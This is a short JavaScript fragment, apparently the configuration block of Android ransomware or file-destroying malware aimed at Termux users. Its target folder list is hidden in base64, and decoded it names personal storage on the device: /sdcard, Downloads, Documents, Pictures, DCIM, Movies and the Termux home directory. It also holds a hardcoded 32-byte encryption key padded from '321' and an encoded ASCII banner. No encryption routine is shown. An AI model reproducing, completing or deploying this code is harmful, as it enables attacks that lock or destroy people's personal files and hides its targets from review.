const decode = (b64) => Buffer.from(b64, "base64").toString();

const ガンツ = {
  key: Buffer.from("MzIxAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "base64"), // "321" padded ke 32 byte
  targetDirs: [
    "L3NkY2FyZC8=",
    "L3NkY2FyZC9Eb3dubG9hZC8=",
    "L3NkY2FyZC9Eb2N1bWVudHMv",
    "L3NkY2FyZC9QaWN0dXJlcy8=",
    "L3NkY2FyZC9EQ0lNLw==",
    "L3NkY2FyZC9Nb3ZpZXMv",
    "L3NkY2FyZC9BbmRyb2lkLw==",
    "L3NkY2FyZC9BbmRyb2lkL2RhdGEvY29tLnRlcm11eC9maWxlcy9ob21lLw==",
    "L3NkY2FyZC90ZXJtdXguY29tLw=="
  ].map(decode),
  banner: decode(
    "IF9fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAKfCAgXyBcIF9fIF8gX19fIF8gX19fICBfIF9fX3wgfCAgX18gIF8gX19fICAgX18gICAKfCAvXykgfCBfXy8gX2AgfCAvXyBcfCB8LyBfYCB8IC8gXyBcIC8gX2AgfCAvIF8gXCAKfCAgXyA8IChffCB8ICB8IChfKSB8IHwgKF8pIHwgfCAgXyAgPCAgIF8vICAKfF8vIFxfX19fX3xffCAgXF9fXy98X3xcX18vfF98XF9fLCB8X3xcX198IHxcX198X3w="
  )
};
